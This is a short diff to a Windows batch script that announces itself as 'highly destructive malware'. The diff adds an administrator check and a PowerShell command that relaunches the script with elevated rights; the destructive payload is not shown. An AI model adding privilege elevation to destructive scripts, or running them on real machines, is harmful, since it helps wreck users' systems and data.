@@ -1,4 +1,16 @@
 @echo off 
+@echo off
+:: Check for admin privileges
+net session >nul 2>&1
+if %errorlevel%==0 (
+    echo Running as administrator...
+) else (
+    echo Requesting admin privileges...
+    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    exit /b
+)
+
+
 echo ==========================================================
 echo WARNING: You are about to execute a highly destructive malware.
 echo DO NOT proceed unless you fully understand the consequences.
